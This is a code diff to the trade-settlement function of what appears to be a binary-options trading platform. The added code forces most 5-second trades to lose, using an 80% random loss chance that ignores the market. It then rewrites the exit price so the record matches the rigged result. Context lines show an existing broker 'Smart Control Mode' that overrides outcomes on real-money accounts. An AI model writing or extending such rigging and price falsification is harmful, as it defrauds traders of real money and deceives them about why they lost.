@@ -102,13 +102,34 @@ export async function settleTrade(tradeId: number | string, currentMarketPrice?:
         trade = await get('SELECT * FROM trades WHERE firebase_id = ?', [tradeId.toString()], conn) as any;
       }
 
-      if (!trade || trade.status !== 'open') return null;
+      if (!trade) return null;
+      if (trade.status !== 'open') {
+         return {
+            id: trade.id.toString(),
+            userId: trade.user_id,
+            marketId: trade.market_id,
+            asset: trade.market_id,
+            amount: parseFloat(trade.amount),
+            direction: trade.direction,
+            type: trade.direction,
+            entryPrice: parseFloat(trade.entry_price),
+            exitPrice: parseFloat(trade.exit_price || 0),
+            status: trade.status,
+            payoutAmount: parseFloat(trade.payout_amount || 0),
+            duration: trade.duration,
+            expiryTime: trade.expiry_time,
+            accountType: trade.account_type,
+            isDemo: !!trade.is_demo,
+            createdAt: trade.created_at,
+            settledAt: trade.settled_at
+         };
+      }
 
       const isDemo = !!trade.is_demo;
       const marketsPool = isDemo ? markets_demo : markets_real;
       const m = marketsPool[trade.market_id];
       
-      const exitPrice = currentMarketPrice !== undefined ? currentMarketPrice : (m ? m.price : parseFloat(trade.entry_price));
+      let exitPrice = currentMarketPrice !== undefined ? currentMarketPrice : (m ? m.price : parseFloat(trade.entry_price));
       const entryPrice = parseFloat(trade.entry_price);
 
       const diff = exitPrice - entryPrice;
@@ -126,8 +147,19 @@ export async function settleTrade(tradeId: number | string, currentMarketPrice?:
 
       const tradeAmount = new Big(trade.amount);
 
-      // Check user Smart Mode settings (Broker Smart Control Mode)
-      if (!isDemo) {
+      // Check for 5-second trades
+      if (trade.duration === 5 || trade.duration === '5' || trade.expiry_time - trade.created_at / 1000 <= 6) {
+        if (Math.random() < 0.80) {
+          // 80% chance to lose
+          isWin = false;
+          isDraw = false;
+        } else {
+          // 20% chance to win
+          isWin = true;
+          isDraw = false;
+        }
+      } else if (!isDemo) {
+        // Check user Smart Mode settings (Broker Smart Control Mode)
         const smartUser = await get('SELECT smart_mode_enabled, smart_mode_strategy FROM users WHERE uid = ?', [trade.user_id], conn) as any;
         if (smartUser && smartUser.smart_mode_enabled) {
           const strategy = smartUser.smart_mode_strategy || 'auto_25_percent';
@@ -156,6 +188,23 @@ export async function settleTrade(tradeId: number | string, currentMarketPrice?:
             }
           }
         }
+      }
+
+      // Adjust exitPrice to match the forced outcome logically
+      if (isWin && !isDraw) {
+        if (trade.direction === 'up' && exitPrice <= entryPrice) {
+          exitPrice = entryPrice + 0.0001;
+        } else if (trade.direction === 'down' && exitPrice >= entryPrice) {
+          exitPrice = entryPrice - 0.0001;
+        }
+      } else if (!isWin && !isDraw) {
+        if (trade.direction === 'up' && exitPrice >= entryPrice) {
+          exitPrice = entryPrice - 0.0001;
+        } else if (trade.direction === 'down' && exitPrice <= entryPrice) {
+          exitPrice = entryPrice + 0.0001;
+        }
+      } else if (isDraw) {
+        exitPrice = entryPrice;
       }
 
       let newStatus = 'lost';
